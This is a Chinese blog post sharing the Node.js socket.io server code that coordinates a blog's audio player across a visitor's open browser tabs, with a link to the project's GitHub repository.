<p>抱着开源共享的想法，现在这里共享一下控制器源码。播放器的就不特地写了，都是前端的东西，右键”查看源代码”即可。如果有什么 bug，希望各位提出，谢谢各位。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)();</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app);</span><br><span class="line"><span class="keyword">var</span> io = <span class="built_in">require</span>(<span class="string">'socket.io'</span>)(http);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">	res.send(<span class="string">'&lt;h1&gt;Welcome Realtime Server&lt;/h1&gt;'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">typeof</span> o;</span><br><span class="line">    <span class="keyword">if</span> (t == <span class="string">'string'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> o.length;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (t == <span class="string">'object'</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> o) &#123;</span><br><span class="line">                n++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="built_in">Date</span>.prototype.Format = <span class="function"><span class="keyword">function</span> (<span class="params">fmt</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = &#123;</span><br><span class="line">        <span class="string">"M+"</span>: <span class="keyword">this</span>.getMonth() + <span class="number">1</span>,</span><br><span class="line">        <span class="string">"d+"</span>: <span class="keyword">this</span>.getDate(),</span><br><span class="line">        <span class="string">"h+"</span>: <span class="keyword">this</span>.getHours(),</span><br><span class="line">        <span class="string">"m+"</span>: <span class="keyword">this</span>.getMinutes(),</span><br><span class="line">        <span class="string">"s+"</span>: <span class="keyword">this</span>.getSeconds(),</span><br><span class="line">        <span class="string">"q+"</span>: <span class="built_in">Math</span>.floor((<span class="keyword">this</span>.getMonth() + <span class="number">3</span>) / <span class="number">3</span>),</span><br><span class="line">        <span class="string">"S"</span>: <span class="keyword">this</span>.getMilliseconds()</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/(y+)/</span>.test(fmt)) fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="keyword">this</span>.getFullYear() + <span class="string">""</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$<span class="number">1.</span>length));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> o)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"("</span> + k + <span class="string">")"</span>).test(fmt)) fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="built_in">RegExp</span>.$<span class="number">1.</span>length == <span class="number">1</span>) ? (o[k]) : ((<span class="string">"00"</span> + o[k]).substr((<span class="string">""</span> + o[k]).length)));</span><br><span class="line">    <span class="keyword">return</span> fmt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dump_log=<span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">	<span class="comment">//console.log("\033[40;33m"+new Date().Format("yyyy-MM-dd hh:mm:ss")+"\033[0m\n"+msg+"\nNow "+count(clients)+" user(s) online.");</span></span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>().Format(<span class="string">"yyyy-MM-dd hh:mm:ss"</span>)+<span class="string">"\n"</span>+msg+<span class="string">"\nNow "</span>+count(clients)+<span class="string">" user(s) online."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> onlineCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> index=<span class="number">0</span>;</span><br><span class="line">global[<span class="string">'clients'</span>]=&#123;&#125;;</span><br><span class="line"></span><br><span class="line">io.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">socket</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">	socket.on(<span class="string">'bindkey'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!str.match(<span class="regexp">/^[a-z0-9]&#123;64&#125;$/</span>)) &#123;</span><br><span class="line">			dump_log(<span class="string">"data: "</span>+str+<span class="string">"\nip: "</span>+socket.handshake.address);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		socket.bindkey = str;</span><br><span class="line">		socket.index = index;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">typeof</span> global[<span class="string">'clients'</span>][str]==<span class="string">"undefined"</span>) &#123;</span><br><span class="line">			global[<span class="string">'clients'</span>][str]=&#123;&#125;;</span><br><span class="line">			onlineCount++;</span><br><span class="line">		&#125;</span><br><span class="line">		global[<span class="string">'clients'</span>][str][index]=&#123;<span class="string">'playing'</span>:(count(global[<span class="string">'clients'</span>][str])==<span class="number">0</span>?<span class="number">1</span>:<span class="number">0</span>),<span class="string">'socket'</span>:socket,<span class="string">'ip'</span>:socket.handshake.address,<span class="string">'index'</span>:index&#125;;</span><br><span class="line">		socket.emit(<span class="string">"message"</span>,[<span class="number">0</span>,index,global[<span class="string">'clients'</span>][str][index][<span class="string">'playing'</span>]]);</span><br><span class="line">		dump_log(<span class="string">"bindkey: "</span>+str+<span class="string">", index: "</span>+index+<span class="string">", ip: "</span>+socket.handshake.address);</span><br><span class="line">		index++;</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	socket.on(<span class="string">'disconnect'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">delete</span> global[<span class="string">'clients'</span>][socket.bindkey][socket.index];</span><br><span class="line">		<span class="keyword">if</span> (count(global[<span class="string">'clients'</span>][socket.bindkey])!==<span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">var</span> ckey <span class="keyword">in</span> global[<span class="string">'clients'</span>][socket.bindkey]) &#123;</span><br><span class="line">				<span class="keyword">var</span> ready_play=global[<span class="string">'clients'</span>][socket.bindkey][ckey];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			ready_play[<span class="string">'playing'</span>]=<span class="number">1</span>;</span><br><span class="line">			ready_play.socket.emit(<span class="string">"message"</span>,[<span class="number">1</span>,ready_play.socket.index,<span class="number">1</span>]);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">delete</span> global[<span class="string">'clients'</span>][socket.bindkey];</span><br><span class="line">			onlineCount--;</span><br><span class="line">		&#125;</span><br><span class="line">		dump_log(<span class="string">"bindkey: "</span>+socket.bindkey+<span class="string">", index: "</span>+socket.index+<span class="string">", ip: "</span>+socket.handshake.address+<span class="string">" offline."</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">http.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'listening on *:3000'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>Docker 项目地址: <a href="https://github.com/jshensh/audioController" target="_blank" rel="noopener">https://github.com/jshensh/audioController</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/10/07/重写了下博客的播放器/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>




<nav class="pagination">
  
  <a href="/page/5/" class="pagination-prev">上一页</a>
  
  
  <a href="/page/7/" class="pagination-next">下一页</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 403 Forbidden
    
  </p>
</footer>
    
  </div>
</div>
</body>
</html>